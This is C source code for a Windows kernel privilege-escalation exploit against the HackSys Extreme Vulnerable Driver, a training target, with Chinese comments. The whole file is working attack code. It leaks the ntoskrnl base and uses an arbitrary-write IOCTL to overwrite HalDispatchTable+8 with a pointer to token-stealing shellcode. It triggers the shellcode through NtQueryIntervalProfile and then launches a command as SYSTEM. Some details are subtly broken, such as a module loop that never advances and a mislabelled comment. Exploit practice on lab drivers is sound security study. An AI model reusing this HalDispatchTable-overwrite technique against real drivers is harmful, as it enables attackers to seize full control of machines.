#include <stdio.h>
#include <Windows.h>

#define SystemModuleInformation	11					//宏定义SystemModuleInformation

typedef NTSTATUS(NTAPI *kZwQuerySystemInformation)(
	_In_       DWORD SystemInformationClass,
	_Inout_    PVOID SystemInformation,
	_In_       ULONG SystemInformationLength,
	_Out_opt_  PULONG ReturnLength
	);

typedef NTSTATUS(NTAPI *kPsLookupProcessByProcessId)(
	IN   HANDLE ProcessId,
	OUT  PVOID Process
	);

typedef NTSTATUS(NTAPI *wNtQueryIntervalProfile)(
	IN   DWORD ProfileSource,
	OUT  ULONG* Interval
	);

typedef struct _SYSTEM_MODULE
{
	HANDLE               Reserved1;
	PVOID                Reserved2;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	USHORT               Id;
	USHORT               Rank;
	USHORT               w018;
	USHORT               NameOffset;
	BYTE                 Name[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[0];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _WHERE_AND_WHAT
{
	PVOID Where;
	PVOID What;
} WHERE_AND_WHAT, *PWHERE_AND_WHAT;


extern "C" void GetSystemToken();




void main(char* argc, char* argv[])
{
	INT64 HalDispatchTable_Kernel;
	HANDLE hDevice;
	DWORD dwRet = 0;
	DWORD Interval = 0;
	char szNtName[256] = { 0 };
	//存放Name的值
	PVOID NtBase;
	//存放ImageBaseAddress
	HMODULE hNtdll = LoadLibraryA("ntdll");
	//ZwQuerySystemInformation在ntdll中所以要载入进程
	WHERE_AND_WHAT exploit;
	if (hNtdll == NULL)
	{
		printf("[-] Load Ntdll fail!");
		return;
	}
	kZwQuerySystemInformation pZwQuerySystemInformation = (kZwQuerySystemInformation)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
	//从ntdll中提取出ZwQuerySystemInformation
	if (pZwQuerySystemInformation == NULL)
	{
		printf("[-] Can not found ZwQuerySystemInformation!");
		return;
	}

	ULONG SystemInfoBufferSize;
	pZwQuerySystemInformation(SystemModuleInformation, &SystemInfoBufferSize, 0, &SystemInfoBufferSize);
	//第一次调用ZwQuerySystemInformation不是为了取值,是判断能不能读出模块信息，如果返回长度为0说明读取失败了，如果不为0则下面第二次调用
	if (SystemInfoBufferSize == 0)
	{
		printf("[-] SystemInfoBufferSize is 0!");
	}
	PULONG pSystemInfoBuffer = (PULONG)LocalAlloc(LMEM_ZEROINIT, SystemInfoBufferSize);
	//开出一块和读出来大小相同的内存，用于存放下次ZwQuerySystemInformation得到的结构
	printf("[+] LocalAlloc:0x%p\n", pSystemInfoBuffer);
	if (pSystemInfoBuffer == 0)
	{
		printf("[-] LocalAlloc is fail!");
		return;
	}
	int ret = pZwQuerySystemInformation(SystemModuleInformation, pSystemInfoBuffer, SystemInfoBufferSize, &SystemInfoBufferSize);

	//第二次调用ZwQuerySystemInformation，将结构存入前面开的内存中
	if (ret)
	{
		printf("[-] ZwQuerySystemInformation is fail!");
		return;
	}

	_SYSTEM_MODULE_INFORMATION* smi = (_SYSTEM_MODULE_INFORMATION *)pSystemInfoBuffer;
	//设置一个SYSTEM_MODULE_INFORMATION指针指向前面开的内存

	printf("[+] Kernel Modle found %d\n", smi->ModulesCount);

	memset(szNtName, 0, 256);			//内存清零
	int i = 0;
	while (i < smi->ModulesCount)
	{
		//循环打印结构的中的值
		SYSTEM_MODULE* sm = (SYSTEM_MODULE *)(smi->Modules + i);
		//如果name中存在.exe和nt，那么将基址存在NtBase，因为这就是有PsLookupProcessByProcessId函数的模块，ntoskrnl.exe
		if (strstr((char*)sm->Name, ".exe") && strstr((char*)sm->Name, "nt"))
		{
			NtBase = sm->ImageBaseAddress;
			strncpy_s(szNtName, 256, strstr((char*)sm->Name, "nt"), _TRUNCATE);
			//将ntoskrnl.exe存入szNtName中，用strstr函数将前面路径的去掉
			break;
		}

	}
	printf("[+] name:%s-0x%p\n", szNtName, NtBase);		//打印ntkrnlpa.exe和内存中的基址
	HMODULE nt = LoadLibraryA(szNtName);			//在当前进程加载ntkrnlpa.exe
	HalDispatchTable_Kernel = (INT64)GetProcAddress(nt, "HalDispatchTable");
	//在当前进程找到PsLookupProcessByProcessId函数地址
	HalDispatchTable_Kernel = ((INT64)NtBase + ((INT64)HalDispatchTable_Kernel - (INT64)nt));
	//得到偏移加上内存中的基址
	printf("[+] HalDispatchTable Address in 0x%p\n", HalDispatchTable_Kernel);
	//输出函数真实的位置

	PVOID AddressShellcode = GetSystemToken;
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL) {
		printf("[-] GetDriver fail!\n");
		return;
	}
	printf("[+] GetDriver Success!\n");
	printf("[+] Second Point Shellcode Address 0x%p\n", &AddressShellcode);
	printf("[+] HalDispatchTable+8 Address 0x%p\n", HalDispatchTable_Kernel + 8);
	exploit.What = (PVOID)(HalDispatchTable_Kernel + 8);
	exploit.Where = &AddressShellcode;
	DeviceIoControl(hDevice, 0x22200B, &exploit, sizeof(exploit), NULL, 0, &dwRet, 0);
	wNtQueryIntervalProfile pNtQueryIntervalProfile = (wNtQueryIntervalProfile)GetProcAddress(hNtdll, "NtQueryIntervalProfile");
	if (pNtQueryIntervalProfile == NULL) {
		printf("[-] Not Find NtQueryIntervalProfile");
		return;
	}

	printf("[+] NtQueryIntervalProfile Address: 0x%p\n", pNtQueryIntervalProfile);
	pNtQueryIntervalProfile(0x2, &Interval);

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	if (argv[1])
	{
		si = { 0 };
		pi = { 0 };
		si.cb = sizeof(si);
		si.dwFlags = 1;
		si.wShowWindow = 0;
		CreateProcessA(NULL, argv[1], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
		WaitForSingleObject(pi.hProcess, 0x10000);
	}


}